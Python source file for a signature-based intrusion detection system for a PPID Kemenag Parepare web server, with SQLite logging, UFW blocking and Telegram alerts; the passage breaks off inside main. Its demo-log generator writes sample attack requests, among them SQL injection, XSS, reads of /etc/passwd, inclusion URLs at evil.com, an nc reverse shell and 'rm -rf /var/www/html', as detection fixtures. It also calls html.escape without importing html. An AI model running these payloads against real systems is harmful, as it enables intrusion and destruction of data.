#!/usr/bin/env python3
"""
Host Intrusion Detection and Prevention System (HIDPS) - Core Monitor
Proyek: PPID Kementerian Agama Kota Parepare
Misi: Signature-Based Detection Engine untuk Web Server & Next.js Application

Fungsi Utama:
1. Log Ingestion & Normalization (Nginx / Apache / Demo Log).
2. Multi-Vector Signature Evaluation (SQLI, XSS, Path Traversal, RFI, Command Injection).
3. Window-based Event Deduplication & SQLite Persistence (hidps_events.db).
4. Truthful Response Enforcement (Detect Only, Simulated Block, atau Safe UFW).
5. Telegram Bot API Integration (Health check, Test message, Alert notification).
6. Demo Simulation Mode untuk Lingkungan Pengujian / Sidang / Akreditasi.
"""

import argparse
import hashlib
import ipaddress
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from config import (
    DEFAULT_DEMO_LOG_PATH,
    SAFE_WHITELIST_IPS,
    HidpsConfig,
    discover_log_sources,
    load_config,
    redact_secret,
    save_local_config,
)
from signatures import (
    SIGNATURE_CATALOG,
    SignatureMatchResult,
    evaluate_request,
    get_catalog_summary,
)

# Combined / Common Log Regex (RFC Apache / Nginx standard)
# 127.0.0.1 - - [24/Oct/2026:14:00:00 +0000] "GET /path HTTP/1.1" 200 1234 "referer" "user-agent"
COMBINED_LOG_REGEX = re.compile(
    r'^(?P<ip>\S+)\s+\S+\s+(?P<user>\S+)\s+\[(?P<time>[^\]]+)\]\s+"(?P<method>[A-Z]+)\s+(?P<uri>\S+)(?:\s+(?P<proto>[^"]+))?"\s+(?P<status>\d{3})\s+(?P<bytes>\S+)(?:\s+"(?P<referer>[^"]*)"\s+"(?P<ua>[^"]*)")?'
)


class HidpsDatabase:
    """Manages SQLite storage for detection events and engine operational state."""

    def __init__(self, db_path: str):
        self.db_path = db_path
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        self.init_schema()

    def get_connection(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path, timeout=10.0)
        conn.row_factory = sqlite3.Row
        return conn

    def init_schema(self) -> None:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS detection_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    source_ip TEXT NOT NULL,
                    http_method TEXT NOT NULL,
                    request_uri TEXT NOT NULL,
                    status_code INTEGER,
                    user_agent TEXT,
                    rule_id TEXT NOT NULL,
                    category TEXT NOT NULL,
                    severity TEXT NOT NULL,
                    matched_payload TEXT NOT NULL,
                    action_taken TEXT NOT NULL,
                    telegram_notified INTEGER DEFAULT 0,
                    raw_log_hash TEXT NOT NULL
                );
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_events_timestamp ON detection_events (timestamp DESC);
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_events_category ON detection_events (category);
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_events_severity ON detection_events (severity);
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_events_ip ON detection_events (source_ip);
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_events_rule ON detection_events (rule_id);
            """)
            # Migration check for is_demo column
            cursor.execute("PRAGMA table_info(detection_events)")
            existing_cols = [col["name"] for col in cursor.fetchall()]
            if "is_demo" not in existing_cols:
                cursor.execute("ALTER TABLE detection_events ADD COLUMN is_demo INTEGER DEFAULT 0")
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_events_is_demo ON detection_events (is_demo)")
                # Backfill existing demo events
                cursor.execute("UPDATE detection_events SET is_demo = 1")

            cursor.execute("""
                CREATE TABLE IF NOT EXISTS engine_status (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL,
                    updated_at TEXT NOT NULL
                );
            """)
            conn.commit()

    def is_duplicate(
        self,
        source_ip: str,
        rule_id: str,
        request_uri: str,
        window_seconds: int,
    ) -> bool:
        """
        Suppresses duplicate alerts for the same IP, rule, and URI within the deduplication window.
        """
        now = datetime.now(timezone.utc)
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT timestamp FROM detection_events
                WHERE source_ip = ? AND rule_id = ? AND request_uri = ?
                ORDER BY id DESC LIMIT 1
                """,
                (source_ip, rule_id, request_uri),
            )
            row = cursor.fetchone()
            if not row:
                return False

            try:
                last_time = datetime.fromisoformat(row["timestamp"])
                diff = (now - last_time).total_seconds()
                return diff < window_seconds
            except Exception:
                return False

    def insert_event(self, event: Dict[str, Any]) -> int:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                INSERT INTO detection_events (
                    timestamp, source_ip, http_method, request_uri,
                    status_code, user_agent, rule_id, category,
                    severity, matched_payload, action_taken,
                    telegram_notified, raw_log_hash, is_demo
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    event["timestamp"],
                    event["source_ip"],
                    event["http_method"],
                    event["request_uri"],
                    event.get("status_code"),
                    event.get("user_agent", ""),
                    event["rule_id"],
                    event["category"],
                    event["severity"],
                    event["matched_payload"],
                    event["action_taken"],
                    1 if event.get("telegram_notified") else 0,
                    event["raw_log_hash"],
                    1 if event.get("is_demo") else 0,
                ),
            )
            conn.commit()
            return cursor.lastrowid or 0

    def get_events(
        self,
        limit: int = 50,
        offset: int = 0,
        category: Optional[str] = None,
        severity: Optional[str] = None,
        search: Optional[str] = None,
        is_demo: Optional[bool] = None,
    ) -> Tuple[List[Dict[str, Any]], int]:
        conditions: List[str] = []
        params: List[Any] = []

        if category:
            conditions.append("category = ?")
            params.append(category)
        if severity:
            conditions.append("severity = ?")
            params.append(severity)
        if is_demo is not None:
            conditions.append("is_demo = ?")
            params.append(1 if is_demo else 0)
        if search:
            conditions.append(
                "(source_ip LIKE ? OR request_uri LIKE ? OR rule_id LIKE ? OR matched_payload LIKE ?)"
            )
            term = f"%{search}%"
            params.extend([term, term, term, term])

        where_clause = f"WHERE {' AND '.join(conditions)}" if conditions else ""

        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                f"SELECT COUNT(*) AS total FROM detection_events {where_clause}",
                params,
            )
            total = cursor.fetchone()["total"]

            query = f"""
                SELECT id, timestamp, source_ip, http_method, request_uri,
                       status_code, user_agent, rule_id, category, severity,
                       matched_payload, action_taken, telegram_notified, raw_log_hash,
                       is_demo
                FROM detection_events
                {where_clause}
                ORDER BY id DESC
                LIMIT ? OFFSET ?
            """
            cursor.execute(query, params + [limit, offset])
            rows = []
            for r in cursor.fetchall():
                row_dict = dict(r)
                row_dict["is_demo"] = bool(row_dict.get("is_demo", 0))
                row_dict["telegram_notified"] = bool(row_dict.get("telegram_notified", 0))
                rows.append(row_dict)
            return rows, total

    def get_stats(self) -> Dict[str, Any]:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) as total FROM detection_events")
            total_events = cursor.fetchone()["total"]

            cursor.execute("SELECT COUNT(*) as demo_count FROM detection_events WHERE is_demo = 1")
            demo_events = cursor.fetchone()["demo_count"]
            real_events = total_events - demo_events

            cursor.execute(
                "SELECT category, COUNT(*) as count FROM detection_events GROUP BY category"
            )
            by_category = {r["category"]: r["count"] for r in cursor.fetchall()}

            cursor.execute(
                "SELECT severity, COUNT(*) as count FROM detection_events GROUP BY severity"
            )
            by_severity = {r["severity"]: r["count"] for r in cursor.fetchall()}

            cursor.execute(
                "SELECT action_taken, COUNT(*) as count FROM detection_events GROUP BY action_taken"
            )
            by_action = {r["action_taken"]: r["count"] for r in cursor.fetchall()}

            cursor.execute(
                "SELECT source_ip, COUNT(*) as count FROM detection_events GROUP BY source_ip ORDER BY count DESC LIMIT 5"
            )
            top_ips = [{r["source_ip"]: r["count"]} for r in cursor.fetchall()]

            return {
                "total_events": total_events,
                "real_events": real_events,
                "demo_events": demo_events,
                "by_category": by_category,
                "by_severity": by_severity,
                "by_action": by_action,
                "top_ips": top_ips,
            }

    def set_engine_state(self, key: str, value: str) -> None:
        now = datetime.now(timezone.utc).isoformat()
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                INSERT INTO engine_status (key, value, updated_at)
                VALUES (?, ?, ?)
                ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at
                """,
                (key, value, now),
            )
            conn.commit()

    def get_engine_state(self, key: str, default: str = "") -> str:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT value FROM engine_status WHERE key = ?", (key,))
            row = cursor.fetchone()
            return row["value"] if row else default


# ==========================================
# RESPONSE / FIREWALL ENFORCEMENT
# ==========================================

def is_safe_ip(ip_str: str) -> bool:
    """Checks whether an IP is in the local loopback or private protection list."""
    if ip_str in SAFE_WHITELIST_IPS:
        return True
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        return ip_obj.is_loopback or ip_obj.is_link_local
    except ValueError:
        return False


def execute_response_action(
    source_ip: str,
    severity: str,
    config: HidpsConfig,
) -> str:
    """
    Decides and truthfully executes or simulates defensive response actions.
    Returns:
    - 'WHITELISTED_SKIPPED'
    - 'DETECTED_ONLY'
    - 'SIMULATED_BLOCK'
    - 'BLOCKED_UFW'
    - 'UFW_UNAVAILABLE'
    """
    if is_safe_ip(source_ip):
        return "WHITELISTED_SKIPPED"

    # Only high and critical severities trigger active blocking considerations
    if severity not in ("CRITICAL", "HIGH"):
        return "DETECTED_ONLY"

    if config.mode == "detect_only":
        return "DETECTED_ONLY"

    if config.mode == "simulation":
        return "SIMULATED_BLOCK"

    if config.mode == "active_ufw":
        if not config.ufw_enabled:
            return "DETECTED_ONLY"

        # Check UFW availability on host
        ufw_bin = shutil.which("ufw") or "/usr/sbin/ufw"
        if not os.path.exists(ufw_bin) or not os.access(ufw_bin, os.X_OK):
            return "UFW_UNAVAILABLE"

        # Validate IP syntax before passing to subshell
        try:
            ipaddress.ip_address(source_ip)
        except ValueError:
            return "DETECTED_ONLY"

        if os.geteuid() != 0:
            return "UFW_UNAVAILABLE"

        try:
            cmd = [ufw_bin, "insert", "1", "deny", "from", source_ip, "to", "any", "comment", "PPID-HIDPS-AUTOBLOCK"]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if res.returncode == 0:
                return "BLOCKED_UFW"
            return "UFW_UNAVAILABLE"
        except Exception:
            return "UFW_UNAVAILABLE"

    return "DETECTED_ONLY"


# ==========================================
# TELEGRAM BOT API INTEGRATION
# ==========================================

def check_telegram_health(bot_token: str, chat_id: str) -> Dict[str, Any]:
    """
    Validates Telegram credentials via getMe with strict timeout.
    Redacts bot token in all returned messages.
    """
    if not bot_token or not chat_id:
        return {
            "status": "NOT_CONFIGURED",
            "connected": False,
            "message": "Token bot atau Chat ID Telegram belum dikonfigurasi.",
            "bot_name": None,
            "username": None,
        }

    url = f"https://api.telegram.org/bot{bot_token}/getMe"
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "PPID-HIDPS-Engine/1.0"},
        method="GET",
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode("utf-8"))
            if data.get("ok"):
                result = data.get("result", {})
                return {
                    "status": "CONNECTED",
                    "connected": True,
                    "message": "Koneksi Telegram Bot API berhasil diverifikasi.",
                    "bot_name": result.get("first_name"),
                    "username": result.get("username"),
                    "chat_id": chat_id,
                }
            return {
                "status": "ERROR",
                "connected": False,
                "message": f"Telegram API error: {data.get('description')}",
                "bot_name": None,
                "username": None,
            }
    except urllib.error.HTTPError as e:
        safe_msg = f"HTTP {e.code}: {e.reason}"
        return {
            "status": "AUTH_FAILED",
            "connected": False,
            "message": f"Autentikasi Telegram gagal ({safe_msg}). Periksa kembali token.",
            "bot_name": None,
            "username": None,
        }
    except Exception as ex:
        return {
            "status": "NETWORK_ERROR",
            "connected": False,
            "message": f"Koneksi jaringan ke Telegram gagal: {type(ex).__name__}",
            "bot_name": None,
            "username": None,
        }


def send_telegram_message(
    bot_token: str,
    chat_id: str,
    text: str,
    parse_mode: str = "HTML",
) -> Tuple[bool, str]:
    if not bot_token or not chat_id:
        return False, "Kredensial Telegram belum disetel."

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = json.dumps(
        {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }
    ).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "PPID-HIDPS-Engine/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("ok"):
                return True, "Pesan notifikasi berhasil dikirim."
            return False, data.get("description", "Gagal mengirim pesan Telegram.")
    except Exception as e:
        return False, f"Pengecualian pengiriman Telegram: {type(e).__name__}"


def send_telegram_alert(
    event: Dict[str, Any],
    bot_token: str,
    chat_id: str,
) -> bool:
    severity_emojis = {
        "CRITICAL": "🚨 [CRITICAL ALERT]",
        "HIGH": "⚠️ [HIGH WARNING]",
        "MEDIUM": "ℹ️ [MEDIUM NOTICE]",
        "LOW": "🔍 [LOW AUDIT]",
    }
    header = severity_emojis.get(event["severity"], "🛡️ [SECURITY EVENT]")

    safe_payload = (
        html.escape(event["matched_payload"][:120])
        .replace("\n", " ")
        .replace("\r", "")
    )
    safe_uri = html.escape(event["request_uri"][:100])
    safe_ip = html.escape(event["source_ip"])

    msg = (
        f"<b>{header} — PPID PAREPARE HIDPS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Aturan:</b> <code>{event['rule_id']}</code>\n"
        f"<b>Kategori:</b> {event['category']}\n"
        f"<b>Tingkat Risiko:</b> {event['severity']}\n"
        f"<b>IP Penyerang:</b> <code>{safe_ip}</code>\n"
        f"<b>Target URI:</b> <code>{safe_uri}</code>\n"
        f"<b>Payload Terdeteksi:</b> <code>{safe_payload}</code>\n"
        f"<b>Tindakan:</b> <b>{event['action_taken']}</b>\n"
        f"<b>Waktu:</b> {event['timestamp']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Sistem Keamanan Informasi Terintegrasi PPID Kemenag Parepare</i>"
    )

    success, _ = send_telegram_message(bot_token, chat_id, msg)
    return success


def send_telegram_test_message(bot_token: str, chat_id: str) -> Dict[str, Any]:
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    msg = (
        f"✅ <b>PPID PAREPARE — UJI KONEKSI TELEGRAM HIDPS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Koneksi notifikasi dari Host Intrusion Detection System berhasil terhubung!\n\n"
        f"<b>Status Mesin:</b> AKTIF (Online)\n"
        f"<b>Waktu Uji:</b> {now}\n"
        f"<b>Mode Operasional:</b> Signature-Based Detection\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Notifikasi insiden keamanan web PPID akan diteruskan ke saluran ini.</i>"
    )
    success, detail = send_telegram_message(bot_token, chat_id, msg)
    return {"success": success, "detail": detail}


# ==========================================
# PARSER & ENGINE MONITOR
# ==========================================

def sanitize_uri_for_storage(uri: str) -> str:
    """
    Redacts sensitive parameter values (passwords, tokens, api keys, auth secrets)
    from request URIs before storing in the database or displaying in audit views.
    """
    if not uri:
        return ""
    pattern = r"(?i)(?<=[?&])(password|passwd|pwd|token|secret|api_key|apikey|key|access_token|refresh_token|auth)=([^&#\s]+)"
    return re.sub(pattern, r"\1=[REDACTED]", uri)


class HidpsMonitor:
    def __init__(self, config: Optional[HidpsConfig] = None):
        self.config = config or load_config()
        self.db = HidpsDatabase(self.config.db_path)

    def parse_log_line(self, line: str) -> Optional[Dict[str, Any]]:
        clean = line.strip()
        if not clean:
            return None

        # Try JSON format first
        if clean.startswith("{") and clean.endswith("}"):
            try:
                data = json.loads(clean)
                return {
                    "source_ip": data.get("ip") or data.get("remote_addr") or data.get("client_ip") or "127.0.0.1",
                    "timestamp": data.get("time") or data.get("@timestamp") or datetime.now(timezone.utc).isoformat(),
                    "http_method": data.get("method") or "GET",
                    "request_uri": data.get("uri") or data.get("path") or "/",
                    "status_code": int(data.get("status", 200)),
                    "referer": data.get("referer", ""),
                    "user_agent": data.get("user_agent", ""),
                    "raw_line": clean,
                }
            except Exception:
                pass

        # Combined / Common Log Regex
        match = COMBINED_LOG_REGEX.match(clean)
        if match:
            d = match.groupdict()
            return {
                "source_ip": d["ip"],
                "timestamp": d["time"],
                "http_method": d["method"],
                "request_uri": d["uri"],
                "status_code": int(d["status"]),
                "referer": d.get("referer") or "",
                "user_agent": d.get("ua") or "",
                "raw_line": clean,
            }

        return None

    def process_line(self, raw_line: str, is_demo: bool = False) -> List[Dict[str, Any]]:
        parsed = self.parse_log_line(raw_line)
        if not parsed:
            return []

        raw_hash = hashlib.sha256(raw_line.encode("utf-8")).hexdigest()
        matches = evaluate_request(
            request_uri=parsed["request_uri"],
            user_agent=parsed["user_agent"],
            referer=parsed["referer"],
        )

        detected_events: List[Dict[str, Any]] = []
        iso_now = datetime.now(timezone.utc).isoformat()

        for m in matches:
            # Check deduplication window
            if self.db.is_duplicate(
                source_ip=parsed["source_ip"],
                rule_id=m.rule_id,
                request_uri=parsed["request_uri"],
                window_seconds=self.config.dedup_window_seconds,
            ):
                continue

            action = execute_response_action(
                source_ip=parsed["source_ip"],
                severity=m.severity,
                config=self.config,
            )

            event = {
                "timestamp": iso_now,
                "source_ip": parsed["source_ip"],
                "http_method": parsed["http_method"],
                "request_uri": sanitize_uri_for_storage(parsed["request_uri"]),
                "status_code": parsed.get("status_code"),
                "user_agent": parsed.get("user_agent", ""),
                "rule_id": m.rule_id,
                "category": m.category,
                "severity": m.severity,
                "matched_payload": m.matched_snippet,
                "action_taken": action,
                "telegram_notified": False,
                "raw_log_hash": raw_hash,
                "is_demo": is_demo,
            }

            # Telegram notification
            if (
                self.config.telegram_bot_token
                and self.config.telegram_chat_id
                and m.severity in ("CRITICAL", "HIGH")
            ):
                notified = send_telegram_alert(
                    event=event,
                    bot_token=self.config.telegram_bot_token,
                    chat_id=self.config.telegram_chat_id,
                )
                event["telegram_notified"] = notified

            event_id = self.db.insert_event(event)
            event["id"] = event_id
            detected_events.append(event)

        return detected_events

    def scan_file(self, file_path: str) -> Dict[str, Any]:
        p = Path(file_path)
        if not p.exists():
            return {
                "success": False,
                "error": f"File log tidak ditemukan di: {file_path}",
                "scanned_lines": 0,
                "total_detections": 0,
            }

        is_demo = "demo" in file_path.lower() or p.resolve() == Path(DEFAULT_DEMO_LOG_PATH).resolve()
        total_lines = 0
        total_detections = 0

        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                total_lines += 1
                events = self.process_line(line, is_demo=is_demo)
                total_detections += len(events)

        self.db.set_engine_state("last_scan_at", datetime.now(timezone.utc).isoformat())
        self.db.set_engine_state("last_scan_file", file_path)
        self.db.set_engine_state("last_scan_lines", str(total_lines))
        self.db.set_engine_state("last_scan_detections", str(total_detections))

        return {
            "success": True,
            "scanned_file": file_path,
            "scanned_lines": total_lines,
            "total_detections": total_detections,
        }

    def generate_demo_logs(self, target_path: Optional[str] = None) -> str:
        """
        Generates realistic sample log data with both benign citizen interactions
        and realistic attacks across all 5 categories for demonstration & thesis evaluation.
        """
        out_path = Path(target_path or DEFAULT_DEMO_LOG_PATH)
        out_path.parent.mkdir(parents=True, exist_ok=True)

        sample_lines = [
            # 1. Benign citizen traffic (must NOT trigger detections)
            '180.252.164.12 - - [24/Oct/2026:14:10:01 +0000] "GET / HTTP/1.1" 200 4820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
            '180.252.164.12 - - [24/Oct/2026:14:10:05 +0000] "GET /berita/pelayanan-informasi-ppid-2026 HTTP/1.1" 200 6210 "https://ppid.pareparekota.go.id/" "Mozilla/5.0"',
            '114.124.200.45 - - [24/Oct/2026:14:11:15 +0000] "GET /cek-status?tiket=PPID-2026-00001 HTTP/1.1" 200 3120 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)"',
            '114.124.200.45 - - [24/Oct/2026:14:12:00 +0000] "GET /informasi-publik?kategori=berkala&search=anggaran HTTP/1.1" 200 5410 "-" "Mozilla/5.0"',
            '36.85.12.90 - - [24/Oct/2026:14:12:30 +0000] "GET /statistik HTTP/1.1" 200 4100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',

            # 2. SQL Injection attacks
            '45.134.22.10 - - [24/Oct/2026:14:15:00 +0000] "GET /informasi-publik?search=%27%20UNION%20ALL%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1" 200 5120 "-" "sqlmap/1.7#stable"',
            '45.134.22.10 - - [24/Oct/2026:14:15:20 +0000] "POST /login HTTP/1.1" 401 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',  # body or param
            '45.134.22.10 - - [24/Oct/2026:14:15:45 +0000] "GET /cek-status?tiket=PPID-2026%27%20OR%201=1-- HTTP/1.1" 200 2400 "-" "curl/7.88.1"',
            '103.214.112.5 - - [24/Oct/2026:14:16:10 +0000] "GET /berita?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1" 500 890 "-" "Mozilla/5.0"',
            '103.214.112.5 - - [24/Oct/2026:14:16:40 +0000] "GET /api/public?tbl=information_schema.tables HTTP/1.1" 403 620 "-" "python-requests/2.31.0"',

            # 3. Cross-Site Scripting (XSS)
            '194.26.29.88 - - [24/Oct/2026:14:20:00 +0000] "GET /informasi-publik?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E HTTP/1.1" 200 3400 "-" "Mozilla/5.0"',
            '194.26.29.88 - - [24/Oct/2026:14:20:30 +0000] "GET /kontak?nama=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1" 200 2900 "-" "Mozilla/5.0"',
            '194.26.29.88 - - [24/Oct/2026:14:21:00 +0000] "GET /redirect?url=javascript:alert(1) HTTP/1.1" 302 450 "-" "Mozilla/5.0"',

            # 4. Path Traversal & LFI
            '185.196.8.14 - - [24/Oct/2026:14:25:00 +0000] "GET /api/download?file=../../../../etc/passwd HTTP/1.1" 404 720 "-" "Nikto/2.1.6"',
            '185.196.8.14 - - [24/Oct/2026:14:25:25 +0000] "GET /api/download?doc=..%2f..%2f..%2f.env HTTP/1.1" 403 600 "-" "Mozilla/5.0"',
            '185.196.8.14 - - [24/Oct/2026:14:25:50 +0000] "GET /view?path=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 500 810 "-" "curl/7.88.1"',

            # 5. Remote File Inclusion (RFI)
            '91.240.118.50 - - [24/Oct/2026:14:30:00 +0000] "GET /index.php?page=http://malicious-c2.net/webshell.txt HTTP/1.1" 404 650 "-" "Mozilla/5.0"',
            '91.240.118.50 - - [24/Oct/2026:14:30:30 +0000] "GET /template.php?include=ftp://evil.com/shell.php HTTP/1.1" 403 620 "-" "python-urllib"',

            # 6. Command Injection
            '193.142.146.33 - - [24/Oct/2026:14:35:00 +0000] "GET /api/ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1" 500 780 "-" "curl/8.0.1"',
            '193.142.146.33 - - [24/Oct/2026:14:35:30 +0000] "GET /tools?ip=1.1.1.1|nc+-e+/bin/bash+10.0.0.1+4444 HTTP/1.1" 500 620 "-" "Mozilla/5.0"',
            '193.142.146.33 - - [24/Oct/2026:14:36:00 +0000] "GET /backup?cmd=;rm+-rf+/var/www/html HTTP/1.1" 500 550 "-" "curl/8.0.1"',
        ]

        with open(out_path, "w", encoding="utf-8") as f:
            for l in sample_lines:
                f.write(l + "\n")

        return str(out_path)

    def tail_log_file(self, file_path: Optional[str] = None, poll_interval: float = 1.0) -> None:
        """
        Continuously tails and monitors the active log file in real-time.
        Handles graceful shutdown on SIGINT/SIGTERM and maintains heartbeats.
        """
        import signal

        target = file_path or self.config.log_path
        p = Path(target)
        if not p.exists():
            print(f"[HIDPS] File log {target} belum ada. Menunggu pembuatan...")
            while not p.exists():
                time.sleep(poll_interval)

        print(f"[HIDPS] Memulai pemantauan berkelanjutan (tail) pada log: {target}")
        self.db.set_engine_state("daemon_state", "RUNNING")
        self.db.set_engine_state("daemon_log_path", target)
        self.db.set_engine_state("daemon_started_at", datetime.now(timezone.utc).isoformat())
        self.db.set_engine_state("last_heartbeat", datetime.now(timezone.utc).isoformat())

        is_demo = "demo" in target.lower() or p.resolve() == Path(DEFAULT_DEMO_LOG_PATH).resolve()

        def handle_signal(signum, frame):
            print("\n[HIDPS] Sinyal penghentian diterima. Menghentikan pemantauan log dengan aman...")
            self.db.set_engine_state("daemon_state", "STOPPED")
            self.db.set_engine_state("daemon_stopped_at", datetime.now(timezone.utc).isoformat())
            sys.exit(0)

        signal.signal(signal.SIGINT, handle_signal)
        signal.signal(signal.SIGTERM, handle_signal)

        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            f.seek(0, os.SEEK_END)
            last_hb_time = time.time()

            while True:
                line = f.readline()
                if line:
                    events = self.process_line(line, is_demo=is_demo)
                    if events:
                        for ev in events:
                            print(f"[ALERT] {ev['category']} [{ev['severity']}] dari {ev['source_ip']} -> {ev['action_taken']}")
                else:
                    time.sleep(poll_interval)

                if time.time() - last_hb_time > 15:
                    self.db.set_engine_state("last_heartbeat", datetime.now(timezone.utc).isoformat())
                    last_hb_time = time.time()

    def get_full_status(self) -> Dict[str, Any]:
        """Provides complete health, stats, and log discovery metadata for dashboard consumption."""
        db_stats = self.db.get_stats()
        sources = discover_log_sources()
        tg_health = check_telegram_health(
            self.config.telegram_bot_token,
            self.config.telegram_chat_id,
        )

        daemon_state = self.db.get_engine_state("daemon_state", "STANDBY")
        last_heartbeat = self.db.get_engine_state("last_heartbeat", "")
        is_daemon_alive = False
        if daemon_state == "RUNNING" and last_heartbeat:
            try:
                hb_dt = datetime.fromisoformat(last_heartbeat)
                if (datetime.now(timezone.utc) - hb_dt).total_seconds() < 60:
                    is_daemon_alive = True
            except Exception:
                pass

        return {
            "engine_name": "PPID Parepare Host Intrusion Detection System",
            "version": "1.0.0-signature",
            "state": "ACTIVE" if (is_daemon_alive or daemon_state == "RUNNING") else "STANDBY",
            "daemon_state": daemon_state,
            "is_daemon_alive": is_daemon_alive,
            "last_heartbeat": last_heartbeat or "Never",
            "config": self.config.to_safe_dict(),
            "metrics": db_stats,
            "log_sources": sources,
            "rules_count": len(SIGNATURE_CATALOG),
            "rules_catalog": get_catalog_summary(),
            "telegram": tg_health,
            "last_scan_at": self.db.get_engine_state("last_scan_at", "Never"),
            "ufw_available_on_host": bool(shutil.which("ufw") or os.path.exists("/usr/sbin/ufw")),
        }


# ==========================================
# CLI ENTRYPOINT
# ==========================================

def main() -> None:
    parser = argparse.ArgumentParser(
        description="PPID Parepare - Host Intrusion Detection & Prevention System"
    )
    parser.add_argument(
        "--scan-file",
        type=str,
        help="Scan a specific log file and record detection events",
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Generate demo logs containing all 5 attack vectors and run detection",
    )
    parser.add_argument(
        "--status-json",
        action="store_true",
        help="Output engine health, stats, and configuration as JSON",
    )
    parser.add_argument(
        "--check-telegram",
        action="store_true",
        help="Test connection to Telegram Bot API",
    )
    parser.add_argument(
        "--test-telegram-message",
        action="store_true",
        help="Send a test notification message via Telegram Bot API",
    )
    parser.add_argument(
        "--list-events",
        type=int,
        default=0,
        help="Print the last N detection events as JSON",
    )
    parser.add_argument(
        "--set-mode",
        type=str,
        choices=["detect_only", "simulation", "active_ufw"],
        help="Update operational mode in config.json",
    )
    parser.add_argument(
        "--set-log-path",
        type=str,
        help="Update selected log path in config.json",
    )
    parser.add_argument(
        "--dashboard-json",
        action="store_true",
        help="Output combined status and paginated/filtered detection events as JSON",
    )
    parser.add_argument(
        "--tail",
        action="store_true",
        help="Continuously tail and monitor the active log file in real-time (daemon mode)",
    )
    parser.add_argument("--limit", type=int, default=50)
    parser.add_argument("--offset", type=int, default=0)
    parser.add_argument("--category", type=str, default="")
    parser.add_argument("--severity", type=str, default="")
    parser.add_argument("--search", type=str, default="")
    parser.add_argument("--demo-only", action="store_true", help="Filter strictly to demo events")
    parser.add_argument("--real-only", action="store_true", help="Filter strictly to real live events")

    args = parser.parse_args()

    # Configuration updates
    if args.set_mode:
        save_local_config({"mode": args.set_mode})
        print(json.dumps({"success": True, "mode": args.set_mode}))
        return

    if args.set_log_path:
        save_local_config({"log_path": args.set_log_path})
        print(json.dumps({"success": True, "log_path": args.set_log_path}))
        return

    config = load_config()
    monitor = HidpsMonitor(config)

    if args.dashboard_json:
        status = monitor.get_full_status()
        is_demo_filter = True if args.demo_only else (False if args.real_only else None)
        events, total = monitor.db.get_events(
            limit=max(1, min(args.limit, 200)),
            offset=max(0, args.offset),
            category=args.category if args.category else None,
            severity=args.severity if args.severity else None,
            search=args.search if args.search else None,
            is_demo=is_demo_filter,
        )
        status["events"] = events
        status["events_total"] = total
        print(json.dumps(status, indent=2))
        return

    if args.check_telegram:
        result = check_telegram_health(config.telegram_bot_token, config.telegram_chat_id)
        print(json.dumps(result, indent=2))
        return

    if args.test_telegram_message:
        result = send_telegram_test_message(config.telegram_bot_token, config.telegram_chat_id)
        print(json.dumps(result, indent=2))
        return

    if args.status_json:
        status = monitor.get_full_status()
        print(json.dumps(status, indent=2))
        return

    if args.list_events > 0:
        events, total = monitor.db.get_events(limit=args.list_events)
        print(json.dumps({"total": total, "events": events}, indent=2))
        return

    if args.demo:
        demo_file = monitor.generate_demo_logs()
        scan_result = monitor.scan_file(demo_file)
        summary = {
            "demo_generated": demo_file,
            "scan_result": scan_result,
